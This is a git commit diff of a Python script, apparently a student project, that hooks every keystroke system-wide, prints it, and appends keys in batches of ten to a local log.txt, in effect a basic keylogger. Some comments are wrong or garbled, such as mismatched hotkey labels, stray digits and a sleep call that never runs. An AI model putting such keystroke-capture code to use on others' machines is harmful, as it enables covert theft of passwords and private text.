e6e4a7bb013da9e5b7d394542dd6bd221e4a5111
RKUCZER <rkuczer@student.bridgew.edu>
2022-10-05 15:46:03 -0400

    new changes made to main.py

--- main.py
+++ main.py
@@ -1,32 +1,24 @@
 import keyboard
 import time
-keys = []
 
-#keyboard.add_hotkey('ctrl + shift + z', print, args=('Hotkey', 'Detected'))
-#keyboard.add_hotkey('ctrl + alt + delete', print, args=('Hotkey', 'Detected'))
+keys = [] #initializes the list of 10 keys to send to log.txt when limit is reached
 
-hotkey = "shift" + "ctrl"
+hotkey1 = keyboard.add_hotkey('ctrl + shift + z', lambda: print("shift+a was Pressed!")) #creates hotkey1 when shift+ctrl+z is pressed
+hotkey2 = keyboard.add_hotkey('shift + a', lambda: print("shift+a was Pressed!")) #creates hotkey2 when shift+s is pressed
 
-def key_pressed(event):
+def key_pressed(event): #creates event handler function when key is pressed
+    key = (event.name) #creates a key object for each key pressed
+    file = open("log.txt", "a") #opens text file in append mode
+    print(key) #standard print call for key pressed
+    keys.append(event.name) #appends to growing list
 
-    key = (event.name)
-    file = open("log.txt", "a")
-    print(key)
-    keys.append(event.name)
-
-    if len(keys) == 10:
+    if len(keys) == 10: #when list is 10 the loop will write to the file log.txt
         for element in keys:
             file.write(element)
-        file.write("\n")
-        keys.clear()
-    file.close()
-    print(keys)
+        file.write("\n") #makes sure each entry is on a new line
+        keys.clear() #clears array for the next 10 elements pressed
+    file.close() #closes the file
 
-#while True:
-#  if keyboard.is_pressed(hotkey):
-#    print("Hotkey is being pressed")
-#    time.sleep(0.05)
-#  time.sleep(0.01)
-
-keyboard.on_press(key_pressed)
-keyboard.wait()
+keyboard.on_press(key_pressed) #event handler for when key pressed to call the function made above12234567890
+keyboard.wait() #waits for next key pressed
+time.sleep(30) #has program terminate after 30 seconds
